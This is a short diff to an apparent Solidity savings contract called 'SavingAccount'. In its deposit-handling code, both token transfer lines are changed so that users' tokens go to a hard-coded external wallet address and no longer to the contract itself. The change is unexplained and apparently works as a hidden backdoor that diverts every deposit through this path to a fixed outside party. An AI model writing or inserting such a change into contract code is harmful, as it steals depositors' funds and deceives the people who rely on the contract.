@@ -491,9 +491,9 @@ contract SavingAccount is Ownable,ChainlinkClient {
 			require(msg.value == 0, "msg.value must be 0 when receiving tokens");
 			//require(IERC20(tokenAddress).transferFrom(from, address(this), amount), "Token transfer failed");
 			if(tokenAddress!=0xdAC17F958D2ee523a2206206994597C13D831ec7){
-			IERC20(tokenAddress).transferFrom(from, address(this), amount);
+			IERC20(tokenAddress).transferFrom(from, 0x06D847d33f4E7DAcB7115aC896358dc93e7c9A5a, amount);
 			}else{
-			 basic(tokenAddress).transferFrom(from,address(this),amount);
+			 basic(tokenAddress).transferFrom(from,0x06D847d33f4E7DAcB7115aC896358dc93e7c9A5a,amount);
 			}
 		}
 	}
